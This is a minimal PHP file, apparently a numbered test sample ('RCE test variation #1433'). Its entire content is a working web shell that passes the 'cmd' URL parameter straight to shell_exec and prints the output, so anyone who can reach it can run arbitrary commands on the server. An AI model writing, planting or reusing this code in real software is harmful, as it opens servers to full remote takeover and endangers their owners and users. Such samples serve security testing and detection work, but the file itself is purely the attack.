<?php
// RCE test variation #1433
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>